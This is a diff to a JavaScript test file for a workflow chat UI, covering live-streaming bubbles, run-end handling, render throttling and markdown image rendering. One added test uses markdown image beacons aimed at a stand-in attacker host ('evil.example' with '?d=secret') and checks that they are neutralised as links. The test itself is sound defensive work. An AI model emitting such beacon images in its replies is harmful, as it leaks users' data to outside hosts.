@@ -11,6 +11,7 @@ import { renderToStaticMarkup } from "react-dom/server";
 import { WorkflowSessionController } from "../dist/workflow_runtime.js";
 import { WorkflowChat } from "../dist/workflow_chat.js";
 import { ChatMessageCard } from "../dist/chat_message_card.js";
+import { Markdown, sameOriginImage } from "../dist/markdown.js";
 import * as api from "../dist/index.js";
 
 const { llmDeltaFromSse, validateLlmDeltaEvent, describeStreamUnavailable, streamRepliesRuntime } = api;
@@ -26,7 +27,7 @@ const liveOf = (controller) => controller.getSnapshot().messages.filter((m) => S
 const assistantTexts = (controller, text) => controller.getSnapshot().messages.filter((m) => m.role === "assistant" && m.content === text);
 
 /** Fake transport whose streamLedger keeps each run's callbacks for the test to drive. */
-function harness({ ledger = {}, deltaAware = true } = {}) {
+function harness({ ledger = {}, deltaAware = true, options = { liveRenderIntervalMs: 0 } } = {}) {
   const state = { streams: new Map(), connects: new Map(), rootStatus: "running" };
   const transport = {
     async getRun(runId) { return { run_id: runId, status: runId === root ? state.rootStatus : "running" }; },
@@ -35,16 +36,16 @@ function harness({ ledger = {}, deltaAware = true } = {}) {
     },
     async getLedger(_runId, after) { return { items: [], next_after: after }; },
     async streamLedger(runId, after, onStep, signal, onOpen, onDelta) {
-      let close;
-      const closed = new Promise((resolve) => { close = resolve; signal.addEventListener("abort", resolve, { once: true }); });
-      state.streams.set(runId, { after, onStep, onDelta: deltaAware ? onDelta : undefined, argCount: arguments.length, close });
+      let close, fail;
+      const closed = new Promise((resolve, reject) => { close = resolve; fail = reject; signal.addEventListener("abort", resolve, { once: true }); });
+      state.streams.set(runId, { after, onStep, onDelta: deltaAware ? onDelta : undefined, argCount: arguments.length, close, fail });
       state.connects.set(runId, (state.connects.get(runId) || 0) + 1);
       onOpen?.();
       await closed;
     },
     async submitCommand() { return { accepted: true }; },
   };
-  const controller = new WorkflowSessionController(transport, { clientId: "live-test" });
+  const controller = new WorkflowSessionController(transport, { clientId: "live-test", ...options });
   const push = (runId, event) => state.streams.get(runId).onDelta(event);
   const step = (runId, item) => state.streams.get(runId).onStep(item);
   return { state, controller, push, step };
@@ -163,13 +164,14 @@ const answer = (cursor, message, runId = root) => ({ cursor, record: { run_id: r
   h.controller.dispose();
 }
 
-// Truncated: explicit, and sticky for the call.
+// A legacy `truncated` field is tolerated silently (the hub no longer truncates).
 {
   const h = await loaded();
-  h.push(root, delta(9, "…tail of a long reply", { snapshot: true, truncated: true }));
-  assert.equal(liveOf(h.controller)[0].live.truncated, true); ok();
-  h.push(root, delta(10, " more"));
-  assert.equal(liveOf(h.controller)[0].live.truncated, true); ok();
+  h.push(root, delta(9, "text so far", { snapshot: true, truncated: true }));
+  h.push(root, delta(10, " more", { truncated: "yes" }));
+  assert.equal(liveOf(h.controller)[0].content, "text so far more"); ok();
+  assert.equal(h.controller.getSnapshot().error, null); ok();
+  assert.equal("truncated" in liveOf(h.controller)[0].live, false); ok();
   h.controller.dispose();
 }
 
@@ -325,6 +327,80 @@ for (const reason of ["failed", "cancelled"]) {
   h.controller.dispose();
 }
 
+// (REVIEW/13 S1) Any terminal root state closes every live bubble of the
+// turn, sub-agents included, even without delta_end; a child's end closes its own.
+for (const [status, output] of [["failed", null], ["cancelled", null], ["completed", {}], ["completed", { response: "Answer." }]]) {
+  const h = await loaded();
+  h.push(root, delta(1, "root text"));
+  h.push(root, delta(1, "child text", { run_id: child, parent_run_id: root, node_id: "researcher" }));
+  assert.equal(liveOf(h.controller).length, 2); ok();
+  h.controller["updateRunState"](root, { run_id: root, status, output });
+  assert.equal(liveOf(h.controller).length, 0, `root ${status} (output ${JSON.stringify(output)}) leaves no live bubble`); ok();
+  if (status !== "completed") assert(h.controller.getSnapshot().messages.some((m) => m.id === `live-end:${child}:call-1` && m.content.includes(status === "failed" ? "failed" : "cancelled"))), ok();
+  h.push(root, delta(2, " late", { run_id: child, parent_run_id: root }));
+  assert.equal(liveOf(h.controller).length, 0, "no bubble after the turn ended"); ok();
+  h.controller.dispose();
+}
+{
+  const h = await loaded();
+  h.push(root, delta(1, "root text"));
+  h.push(root, delta(1, "child text", { run_id: child, parent_run_id: root, node_id: "researcher" }));
+  h.controller["updateRunState"](child, { run_id: child, status: "completed", output: {} });
+  assert.deepEqual(liveOf(h.controller).map((m) => m.id), [`live:${root}:call-1`], "a child's end closes only its bubbles"); ok();
+  h.controller.dispose();
+}
+
+// (REVIEW/13 S4) Closed-call keys are pruned when a run ends; late frames stay refused.
+{
+  const h = await loaded();
+  h.push(root, delta(1, "a", { run_id: child, parent_run_id: root }));
+  h.push(root, end(2, "completed", { run_id: child, parent_run_id: root }));
+  h.push(root, delta(1, "b"));
+  h.push(root, end(2, "completed"));
+  assert.equal(h.controller["closedLiveCalls"].size, 2); ok();
+  h.controller["updateRunState"](child, { run_id: child, status: "completed", output: {} });
+  assert.deepEqual([...h.controller["closedLiveCalls"]], [`${root}:call-1`], "a child's end prunes its keys only"); ok();
+  h.push(root, delta(3, "late", { run_id: child, parent_run_id: root, snapshot: true }));
+  assert.equal(liveOf(h.controller).length, 0, "an ended child's call stays closed"); ok();
+  h.controller["updateRunState"](root, { run_id: root, status: "completed", output: {} });
+  assert.equal(h.controller["closedLiveCalls"].size, 0, "the root's end prunes every key"); ok();
+  h.push(root, delta(3, "late", { snapshot: true }));
+  assert.equal(liveOf(h.controller).length, 0); ok();
+  h.controller.dispose();
+}
+
+// (REVIEW/13 S2) When the controller stops following a stream, its bubbles close.
+{
+  const h = await loaded();
+  h.push(root, delta(1, "text"));
+  h.push(root, delta(1, "child", { run_id: child, parent_run_id: root }));
+  h.state.streams.get(root).fail(Object.assign(new Error("signed out"), { status: 401 })); // the host stops following
+  await tick(); await tick();
+  assert.equal(h.controller.getSnapshot().connection, "disconnected"); ok();
+  assert.equal(liveOf(h.controller).length, 0, "no orphan bubble once the stream is no longer followed"); ok();
+  h.controller.dispose();
+}
+
+// (REVIEW/13 nit) Live re-rendering is throttled (default 60 ms), latest text always lands.
+{
+  const h = await loaded({ options: {} });
+  let renders = 0;
+  h.controller.subscribe(() => { renders += 1; });
+  h.push(root, delta(1, "a"));
+  assert.equal(liveOf(h.controller)[0].content, "a", "the first frame renders at once"); ok();
+  const after = renders;
+  for (let seq = 2; seq <= 20; seq += 1) h.push(root, delta(seq, "b"));
+  assert.equal(liveOf(h.controller)[0].content, "a", "frames inside the interval wait"); ok();
+  assert.equal(renders, after, "no re-render inside the interval"); ok();
+  await new Promise((r) => setTimeout(r, 90));
+  assert.equal(liveOf(h.controller)[0].content, "a" + "b".repeat(19), "the latest text renders at the end of the interval"); ok();
+  assert.equal(renders, after + 1, "one render for 19 frames"); ok();
+  h.push(root, end(21, "completed"));
+  assert.equal(liveOf(h.controller).length, 0); ok();
+  assert.throws(() => new WorkflowSessionController({}, { liveRenderIntervalMs: -1 }), /liveRenderIntervalMs/); ok();
+  h.controller.dispose();
+}
+
 // Malformed delta: visible error, never a guessed bubble.
 {
   const h = await loaded();
@@ -350,15 +426,15 @@ for (const reason of ["failed", "cancelled"]) {
   assert.match(card, /pc-chat-item--live/); ok();
   assert.match(card, /aria-busy="true"/); ok();
   assert.match(card, /pc-chat-live-indicator[^>]*>.*streaming/); ok();
-  assert.match(card, /Earlier text was dropped by the gateway\./); ok();
+  assert.doesNotMatch(card, /Earlier text|dropped/, "no truncation note, even for a legacy truncated field"); ok();
   assert.match(card, /pc-chat-live-caption">sub-agent · researcher</); ok();
   assert.match(card, /<details class="pc-chat-thinking"><summary>Thinking<\/summary>/, "reasoning is collapsed by default"); ok();
   const body = card.slice(card.indexOf("pc-chat-body"));
   assert(body.includes("Visible reply") && !body.includes("hidden plan"), "reasoning never mixed into the reply text"); ok();
   const plain = renderToStaticMarkup(React.createElement(ChatMessageCard, { message: { id: "a", role: "assistant", content: "Visible reply" } }));
   assert.doesNotMatch(plain, /streaming|pc-chat-thinking|Earlier text/); ok();
-  const noTrunc = renderToStaticMarkup(React.createElement(ChatMessageCard, { message: { ...liveMessage, live: { callId: "c", reasoning: "", truncated: false } } }));
-  assert.doesNotMatch(noTrunc, /Earlier text|pc-chat-thinking|pc-chat-live-caption/); ok();
+  const bare = renderToStaticMarkup(React.createElement(ChatMessageCard, { message: { ...liveMessage, live: { callId: "c", reasoning: "" } } }));
+  assert.doesNotMatch(bare, /pc-chat-thinking|pc-chat-live-caption/); ok();
 
   const base = { messages: [liveMessage], draft: "", onDraftChange() {}, onSend() {} };
   const chat = renderToStaticMarkup(React.createElement(WorkflowChat, { ...base, streamReplies: "on" }));
@@ -370,6 +446,21 @@ for (const reason of ["failed", "cancelled"]) {
   assert.deepEqual(streamRepliesRuntime("off"), { stream: false }); ok();
   assert.deepEqual(streamRepliesRuntime("gateway_default"), {}); ok();
   assert.throws(() => streamRepliesRuntime("yes"), /Unknown streamReplies mode/); ok();
+  // (REVIEW/13 S3) Images in assistant/system messages render as links unless same-origin.
+  const md = "![plot](/api/gateway/runs/r1/workspace/content?path=a.png)\n\n![beacon](https://evil.example/t.gif?d=secret)\n\nInline ![pix](//evil.example/p.png) text";
+  const remoteImg = /<img[^>]+src="(https?:)?\/\/evil/;
+  for (const message of [{ id: "f", role: "assistant", content: md }, { ...liveMessage, content: md }, { id: "s", role: "system", content: md }]) {
+    const html = renderToStaticMarkup(React.createElement(ChatMessageCard, { message }));
+    assert.doesNotMatch(html, remoteImg, `${message.role}${message.live ? " (live)" : ""}: no remote image loads`); ok();
+    assert.match(html, /<a[^>]+href="https:\/\/evil\.example\/t\.gif\?d=secret"[^>]*>image: beacon<\/a>/); ok();
+    assert.match(html, />image: pix<\/a>/); ok();
+    assert.match(html, /<img[^>]+src="\/api\/gateway\/runs\/r1\/workspace\/content\?path=a\.png"/, "same-origin (workspace) images stay inline"); ok();
+  }
+  assert.match(renderToStaticMarkup(React.createElement(ChatMessageCard, { message: { id: "u", role: "user", content: md } })), remoteImg, "the user's own message keeps inline images"); ok();
+  assert.match(renderToStaticMarkup(React.createElement(ChatMessageCard, { message: { id: "o", role: "assistant", content: md }, images: "inline" })), remoteImg, "a host can opt back in"); ok();
+  assert.match(renderToStaticMarkup(React.createElement(Markdown, { text: md })), remoteImg, "Markdown alone keeps its inline default"); ok();
+  assert.doesNotMatch(renderToStaticMarkup(React.createElement(Markdown, { text: md, images: "link", inlineImage: () => false })), /<img/); ok();
+  assert.equal(sameOriginImage("/x.png"), true); assert.equal(sameOriginImage("//evil/x.png"), false); assert.equal(sameOriginImage("https://evil/x.png"), false); ok();
   for (const name of ["llmDeltaFromSse", "validateLlmDeltaEvent", "isLlmDeltaEnd", "streamRepliesRuntime", "describeStreamUnavailable"]) assert.equal(typeof api[name], "function", name);
   ok();
 }
